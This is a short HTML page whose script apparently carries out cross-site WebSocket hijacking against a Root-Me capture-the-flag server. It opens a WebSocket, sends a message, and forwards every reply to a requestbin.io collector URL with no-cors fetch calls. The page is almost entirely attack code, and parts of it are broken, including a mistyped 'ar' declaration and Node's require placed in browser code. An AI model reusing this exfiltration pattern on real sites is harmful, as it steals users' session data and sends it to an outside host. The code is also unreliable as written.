<!DOCTYPE html>
<html>
<body>
  <script>
    websocket = new WebSocket('ws://ctf02.root-me.org/ws');
    websocket.onopen = start
    websocket.onmessage = handleReply
    ar request = require('request');
    var url ='https://requestbin.io/1cyce261'
    request(url, function (error, response, body) {
      if (!error) {
        console.log(body);
      }
  });
    function start(event) {
      websocket.send("msg");
      fetch('https://requestbin.io/1cyce261', {method:'POST',mode:'no-cors',body:event.data})
    }
    function handleReply(event) {
      fetch('https://requestbin.io/1cyce261', {method:'POST',mode:'no-cors',body:event.data})
    }
  </script>
